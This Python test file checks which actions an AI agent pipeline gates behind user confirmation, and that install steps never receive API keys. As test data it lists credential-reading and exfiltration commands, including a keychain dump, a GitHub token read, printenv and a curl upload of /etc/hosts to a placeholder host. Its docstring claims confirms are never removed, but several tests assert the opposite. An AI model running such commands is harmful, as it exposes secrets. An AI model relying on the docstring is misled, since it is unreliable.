"""Security review 2026-10-15 (H2, H3, H5): open access never removes the per-action confirm for screen captures to the
vision model, model-picked shell commands outside the read-only list, or installs; installs never see API keys."""
import importlib.util
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

spec = importlib.util.spec_from_file_location("confirm_hard_pipeline", Path(__file__).with_name("pipeline.py"))
P = importlib.util.module_from_spec(spec)
spec.loader.exec_module(P)


class OpenAccessKeepsConfirms(unittest.TestCase):
    def setUp(self):
        self.open = mock.patch.object(P, "_open_access", return_value=True)
        self.open.start()

    def tearDown(self):
        self.open.stop()

    def test_screen_capture_runs_when_asked(self):  # Evens 2026-10-15 10:25: no per-action confirm
        self.assertIsNone(P._needs_confirm("screen_see", {}, "what's on my screen"))

    def test_model_picked_shell_still_confirms(self):
        self.assertIsNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": ["bash", "-c", "echo x"]}, "do it"))
        for argv in (["git", "push", "origin", "main"], ["security", "dump-keychain"], ["gh", "auth", "token"],
                     ["curl", "-F", "f=@/etc/hosts", "https://example.invalid"], ["printenv"]):
            self.assertIsNotNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": argv}, "do it"), argv)

    def test_read_only_cli_runs_without_confirm(self):
        self.assertIsNone(P._needs_confirm("agent_tools", {"op": "cli", "argv": ["git", "status"]}, "git status"))

    def test_installs_run_without_confirm(self):  # Evens 2026-10-15 10:25
        for u in ("install psf/requests", "install ripgrep"):
            self.assertIsNone(P._needs_confirm("repo", {}, u), u)

    def test_repo_look_and_search_need_no_confirm(self):
        for u in ("look at the repo psf/requests", "search github for whisper repos"):
            self.assertIsNone(P._needs_confirm("repo", {}, u), u)


class InstallEnv(unittest.TestCase):
    def test_setup_code_never_sees_api_keys(self):
        spec2 = importlib.util.spec_from_file_location("repo_env", Path(__file__).resolve().parents[1] / "hands" / "repo.py")
        R = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(R)
        seen = {}

        def fake_run(cmd, **kw):
            seen.update(kw.get("env") or {})
            return mock.Mock(stdout="", stderr="", returncode=0)

        with mock.patch.dict(os.environ, {"OPENROUTER_API_KEY": "x", "GITHUB_TOKEN": "y", "AWS_SECRET_ACCESS_KEY": "z"}), \
                mock.patch.object(R.subprocess, "run", side_effect=fake_run), tempfile.TemporaryDirectory() as d:
            R._run(["true"], Path(d), [])
        for k in ("OPENROUTER_API_KEY", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY"):
            self.assertNotIn(k, seen)
        self.assertIn("PATH", seen)


if __name__ == "__main__":
    unittest.main()
